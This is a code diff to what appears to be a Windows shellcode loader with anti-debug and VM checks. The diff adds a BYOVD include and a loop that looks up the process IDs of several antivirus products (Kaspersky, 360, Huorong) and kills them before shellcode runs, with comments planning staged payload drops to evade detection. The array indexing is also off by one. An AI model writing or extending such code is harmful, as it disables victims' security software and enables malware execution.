@@ -4,6 +4,7 @@
 #include "WorkerFactory.h"
 #include "Varient1.h"
 #include "comAntiDebug.h"
+#include "BYOVD.h"
 #define MUTEX_NAME L"Global\\{B6748A47-F1A5-4B23-9781-858927C53290}"
 
 typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)
@@ -182,15 +183,25 @@ int main()
     //再次确认标志位（防止 OEP 之后被动态修改）
     if (!g_VM_FLAG)
     {
+		//todo... 循环线程来KillAV(BYOVD)并行执行shellcode,尽量分步drop payload，降低被杀软查杀的风险
+        DWORD AVpid[4] = {0};
+        AVpid[1] = { getPIDByName(L"avp.exe") };
+        AVpid[2] = { getPIDByName(L"360sd.exe") };
+        AVpid[3] = { getPIDByName(L"HipsMain.exe") };
+        AVpid[4] = { getPIDByName(L"zhudongfangyu.exe") };
+        for (int i = 0; i < 4; i++)
+        {
+            AVKiller(AVpid[i]);
+        }
 
+        //BYOVD(DWORD pid)
          the_shell_loader();
 		printf("Shellcode 执行完毕.\n");
     }
-
+	//shellcode加载善后处理，避免崩溃 todo...
 
 
 	
-	//todo
 
 
 
